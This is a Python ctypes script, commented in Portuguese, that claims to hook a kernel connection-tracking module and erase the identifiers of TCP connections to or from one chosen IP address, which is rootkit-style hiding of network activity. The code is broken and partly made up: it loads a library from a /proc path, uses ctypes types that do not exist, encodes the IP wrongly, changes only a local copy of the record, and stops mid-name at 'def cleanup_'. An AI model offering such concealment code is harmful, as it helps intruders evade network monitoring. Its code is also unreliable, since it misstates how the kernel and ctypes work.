import ctypes

# Defina as constantes do kernel necessárias
TCP_CONNST_STATE_MAX = 13
TCP_CONN_INFO = 128

# Carregue a biblioteca do kernel
libc = ctypes.CDLL('/lib/libc.so.6')
kmod = ctypes.CDLL('/proc/sys/kernel/modules/tcp_conntrack/license')

# Defina as funções do kernel
tcp_conntrack_init = kmod.tcp_conntrack_init
tcp_conntrack_iter = kmod.tcp_conntrack_iter
tcp_conntrack_fini = kmod.tcp_conntrack_fini

# Defina as estruturas do kernel
class tcp_conntrack(ctypes.Structure):
    _fields_ = [
        ('ct_family', ctypes.c_ushort),
        ('ct_state', ctypes.c_ushort),
        ('ct_proto', ctypes.c_uchar),
        ('ct_source', ctypes.c_uint32),
        ('ct_dest', ctypes.c_uint32),
        ('ct_sport', ctypes.c_ushort),
        ('ct_dport', ctypes.c_ushort),
        ('ct_mark', ctypes.c_uint32),
        ('ct_secmark', ctypes.c_uint32),
        ('ct_secure_flags', ctypes.c_uint32),
        ('ct_flags', ctypes.c_uint32),
        ('ct_len', ctypes.c_ushort),
        ('ct_proto_help', ctypes.c_pointer),
        ('ct_udata', ctypes.c_pointer),
        ('ct_extra', ctypes.c_pointer),
        ('ct_id', ctypes.c_uint32),
        ('ct_gencnt', ctypes.c_uint32),
        ('ct_recv_cnt', ctypes.c_uint32),
        ('ct_send_cnt', ctypes.c_uint32),
        ('ct_ts_recv', ctypes.c_uint32),
        ('ct_ts_send', ctypes.c_uint32),
        ('ct_tv_sec', ctypes.c_uint32),
        ('ct_tv_usec', ctypes.c_uint32),
        ('ct_saddr', ctypes.c_uint32),
        ('ct_daddr', ctypes.c_uint32),
        ('ct_repl', ctypes.c_uint32),
        ('ct_bytes_recv', ctypes.c_uint64),
        ('ct_bytes_send', ctypes.c_uint64),
        ('ct_mark_cnt', ctypes.c_uint32),
        ('ct_secmark_cnt', ctypes.c_uint32),
        ('ct_packets_recv', ctypes.c_uint64),
        ('ct_packets_send', ctypes.c_uint64),
    ]

# Função para inicializar o módulo do kernel
def init_module():
    tcp_conntrack_init()

# Função para iterar pelas conexões TCP/Socket
def iter_connections():
    conntrack = tcp_conntrack()
    ip_to_hide = 0x2a2a2a2a  # Substitua por 0x2a2a2a2a (binário) do IP 172.16.254.251

    while True:
        if tcp_conntrack_iter(ctypes.byref(conntrack)) != 0:
            break

        # Verifique se a conexão está no estado ESTABLISHED
        if conntrack.ct_state != TCP_CONNST_STATE_MAX:
            continue

        # Verifique se o IP de origem ou de destino corresponde ao IP a ser ocultado
        if conntrack.ct_saddr == ip_to_hide or conntrack.ct_daddr == ip_to_hide:
            # Aplique a lógica para limpar os identificadores da conexão
            # (endereço IP, porta, PID, etc.)

            # Exemplo: Limpar o endereço IP de origem
            conntrack.ct_saddr = 0

            # ... (Limpe outros identificadores conforme necessário)

# Função para finalizar o módulo do kernel
def cleanup_